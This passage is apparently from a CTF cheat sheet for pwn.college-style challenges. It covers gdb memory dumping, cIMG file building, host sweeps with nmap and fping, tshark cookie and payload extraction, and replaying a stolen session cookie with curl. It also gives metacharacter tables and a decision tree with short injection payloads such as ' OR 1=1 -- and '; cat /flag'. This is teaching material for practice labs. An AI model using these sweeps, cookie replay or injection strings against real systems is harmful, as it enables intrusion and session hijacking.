# Address
gdb -batch -ex "p/x &desired_output" /challenge/cimg

# Dump to file
gdb -batch -ex "dump binary memory /tmp/out.bin 0x404020 0x404020+32760" /challenge/cimg

# Disassemble
gdb -batch -ex "disassemble main" /challenge/cimg

# Find size (via NUL terminator or immediate in code)
gdb -batch -ex "x/1000s 0x404020" /challenge/cimg
```

## 7.8 Parse ANSI Pixels

```python
import re
raw = open("/tmp/desired.bin","rb").read()
pixels = []
for i in range(0, len(raw), 24):
    blk = raw[i:i+24]
    r = int(blk[7:10]); g = int(blk[11:14]); b = int(blk[15:18]); c = blk[19]
    pixels.append((r,g,b,c))

# Or with regex
pattern = rb'\x1b\[38;2;(\d{3});(\d{3});(\d{3})m(.)\x1b\[0m'
for m in re.finditer(pattern, raw):
    pixels.append((int(m.group(1)), int(m.group(2)), int(m.group(3)), m.group(4)[0]))
```

## 7.9 Build cIMG (v3, single patch)

```python
import struct

header = b"cIMG" + (3).to_bytes(2,"little") + bytes([W,H]) + (1).to_bytes(4,"little")
body = struct.pack("<H", 43709) + bytes([0, 0, W, H])
for p in pixels:
    body += bytes(p)

open("solution.cimg","wb").write(header + body)
```

## 7.10 Space-Optimized Packing

**Key insight:** spaces are ignored in comparison → only write non-space pixels.

**Algorithm:** largest-rectangle-in-histogram, then try all W×H factor pairs.

```python
def largest_rect(covered, img, W, H):
    best = None; best_area = 0
    heights = [0]*W
    for y in range(H):
        for x in range(W):
            heights[x] = 0 if covered[y][x] or img[y][x][3] == 32 else heights[x] + 1
        stack = []
        for x in range(W+1):
            h = heights[x] if x < W else 0
            start = x
            while stack and stack[-1][1] > h:
                sx, sh = stack.pop()
                area = sh * (x - sx)
                if area > best_area:
                    best_area = area
                    best = (sx, y-sh+1, x-sx, sh)
                start = sx
            stack.append((start, h))
    return best
```

**Cost:** `12 + Σ(6 + 4·w·h)` per directive. Limit typically **1337** or **1340**.

## 7.11 GDB Symbols You'll See

| Symbol | Meaning |
|--------|---------|
| `desired_output` | Target to match |
| `cimg.framebuffer` | Runtime framebuffer |
| `total_data` | Total bytes read |
| `handle_*` | Directive handlers |

---

# 📡 8. Network Interception

## 8.1 Find Hosts

```bash
# fping (fastest)
fping -a -g 10.0.0.0/24 2>/dev/null

# nmap
nmap -sn 10.0.0.0/16
nmap -sn -PS80 10.0.0.0/16    # if ICMP blocked

# Parallel bash
for i in $(seq 1 254); do
  (ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo "UP: 10.0.0.$i") &
done; wait

# Python
python3 ping_sweep.py 10.0.0    # see earlier in playbook
```

## 8.2 tshark Basics

**Wireshark is GUI-only.** Use `tshark` (CLI).

| Command | Purpose |
|---------|---------|
| `tshark -i eth0` | Capture on interface |
| `tshark -i eth0 -f "FILTER"` | Capture filter (BPF) |
| `tshark -i eth0 -w file.pcap` | Write to pcap |
| `tshark -r file.pcap` | Read pcap |
| `tshark -r f.pcap -Y "FILTER"` | Display filter |
| `tshark -r f.pcap -T fields -e F` | Print field |
| `tshark -r f.pcap -q -z follow,tcp,ascii,N` | Follow stream |
| `tshark -r f.pcap -V` | Verbose (hex+ASCII) |

## 8.3 Common tshark Filters

| Filter | Matches |
|--------|---------|
| `tcp port 80` | HTTP |
| `tcp port 31337` | Custom port |
| `host 10.0.0.2` | Specific host |
| `http.cookie` | Request cookies |
| `http.set_cookie` | Response cookies |
| `http.request` | Requests |
| `http.response` | Responses |
| `tcp.len > 0` | Packets with payload |
| `tcp.payload` | Payload hex field |
| `frame contains "pwn.college"` | Text search |
| `http.request.uri` | Request path |

## 8.4 Cookie Extraction

```bash
# Client-sent cookies
tshark -r cap.pcap -Y "http.cookie" -T fields -e http.cookie

# Server-set cookies
tshark -r cap.pcap -Y "http.set_cookie" -T fields -e http.set_cookie

# Full HTTP stream
tshark -r cap.pcap -q -z follow,tcp,ascii,0
```

## 8.5 Payload Extraction (TCP)

```bash
# Print payload hex
tshark -i eth0 -f "tcp port 31337" -T fields -e tcp.payload -Y "tcp.len > 0"

# Decode hex → text
tshark -r cap.pcap -T fields -e tcp.payload -Y "tcp.len > 0" | xxd -r -p

# Search for flag pattern
tshark -r cap.pcap -Y "frame contains \"pwn.college\""
```

## 8.6 Use Stolen Cookie

```bash
# Direct
curl --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ..." http://10.0.0.2/flag

# From file (Netscape format)
echo "10.0.0.2	FALSE	/	FALSE	0	session	eyJ1c2VyIjoiYWRtaW4ifQ..." > c.txt
curl -b c.txt http://10.0.0.2/flag
```

## 8.7 HTTPS (encrypted)

| Method | Requirement |
|--------|-------------|
| **SSLKEYLOGFILE** | Set env: `export SSLKEYLOGFILE=/tmp/keys.log`, feed to tshark: `-o tls.keylog_file:/tmp/keys.log` |
| **mitmproxy / Burp** | Run traffic through proxy |
| **Certificate injection** | Install CA cert in target |

*Most CTF challenges use HTTP (plaintext), not HTTPS.*

## 8.8 Why HTTPS Matters

| HTTP | HTTPS |
|------|-------|
| Plaintext | Encrypted |
| Anyone on network can read | Needs key or MITM |
| Session cookies visible | Session cookies hidden |

---

# 🔢 9. Universal Payload/Encoding Table

## 9.1 Shell Metacharacters

| Char | Shell meaning | URL |
|------|---------------|-----|
| `;` | Sequential | `%3B` |
| `&` | Background | `%26` |
| `&&` | AND | `%26%26` |
| `\|\|` | OR | `%7C%7C` |
| `\|` | Pipe | `%7C` |
| `` ` `` | Cmd sub | `%60` |
| `$()` | Cmd sub | `%24%28%29` |
| `\n` | Newline | `%0A` |
| `\t` | Tab | `%09` |
| `#` | Comment | `%23` |
| `>` | Redirect out | `%3E` |
| `<` | Redirect in | `%3C` |

## 9.2 SQL Metacharacters

| Char | Purpose | URL |
|------|---------|-----|
| `'` | String quote | `%27` |
| `"` | String quote | `%22` |
| `--` | Comment | `%2D%2D` |
| `#` | Comment (MySQL) | `%23` |
| `;` | Statement end | `%3B` |
| `\|\|` | Concat | `%7C%7C` |
| `%` | Wildcard | `%25` |
| `_` | Wildcard 1 | `%5F` |

## 9.3 HTML Metacharacters

| Char | HTML entity | Purpose |
|------|-------------|---------|
| `<` | `&lt;` | Tag start |
| `>` | `&gt;` | Tag end |
| `&` | `&amp;` | Entity |
| `"` | `&quot;` | Attr quote |
| `'` | `&#x27;` | Attr quote |

## 9.4 File Magic Numbers

| Type | Magic | ASCII |
|------|-------|-------|
| ELF | `7F 45 4C 46` | `\x7fELF` |
| PNG | `89 50 4E 47` | `\x89PNG` |
| JPEG | `FF D8 FF` | `\xff\xd8\xff` |
| GIF | `47 49 46 38` | `GIF8` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK\x03\x04` |
| gzip | `1F 8B` | `\x1f\x8b` |
| SQLite | `53 51 4C 69 74 65` | `SQLite` |
| cIMG | `63 49 4D 47` | `cIMG` |

## 9.5 Quick Port Reference

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |
| 1337 | Leet (CTF) |
| 31337 | Elite (CTF) |
| 8080 | HTTP alt |

## 9.6 File Descriptor Reference

| FD | Purpose |
|----|---------|
| 0 | stdin |
| 1 | stdout |
| 2 | stderr |
| 3+ | files, sockets |

---

# 🎯 Quick Decision Tree

**"I have a URL and a flag to find."**

1. **Is it a web app?** → Try `/flag`, `/flag.txt`, path traversal.
2. **Does it reflect input?** → Try XSS payloads.
3. **Does it take a query?** → Try SQLi (`' OR 1=1 --`).
4. **Does it take a filename?** → Try command injection (`; cat /flag`).
5. **Does it authenticate?** → Try auth bypass (`?user=admin`, `Cookie: user=admin`).
6. **Is it a binary?** → GDB + disassemble, find `desired_output` or `win`.
7. **Is it network traffic?** → tshark capture, extract cookies.

**"I have a binary and need to find data."**

1. `file bin` — ELF or script?
2. `strings bin` — look for flag, symbol names.
3. `objdump -d -M intel bin` — disassemble.
4. `gdb -batch -ex "disassemble main" bin` — see main logic.
5. `gdb -batch -ex "p/x &symbol" bin` — get symbol addresses.
6. `gdb -batch -ex "dump binary memory /tmp/out addr addr+N" bin` — dump data.

---

**Happy hacking! 🚀**

*This cheat sheet is for educational purposes only. Use responsibly.*
